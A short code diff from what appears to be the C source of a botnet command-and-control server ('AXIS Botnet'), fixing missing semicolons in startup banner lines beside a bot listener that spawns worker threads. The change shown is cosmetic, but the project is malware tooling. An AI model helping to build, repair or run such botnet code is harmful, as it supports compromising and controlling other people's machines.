@@ -690,8 +690,8 @@ void *BotListener(int port) {
         pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
 }}
 int main (int argc, char *argv[], void *sock) {
-		printf("\e[1;91m[ \e[0mINFO \e[1;91m]\e[0m Coded by \e[1;91m@i_am_unbekannt\r\n")
-		printf("\r\n")
+	    printf("\e[1;91m[ \e[0mINFO \e[1;91m]\e[0m Coded by \e[1;91m@i_am_unbekannt\r\n");
+	    printf("\r\n");
 	    printf("\e[1;91m[ \e[0mINFO \e[1;91m]\e[0m Starting \e[1;91mAXIS\e[0m Botnet\e[1;91m...\e[0m\r\n");
 	    printf("\e[1;91m[ \e[0mINFO \e[1;91m] AXIS\e[0m Botnet Is Online\e[1;91m...\e[0m\r\n");
 	    printf("\e[0m\r\n");
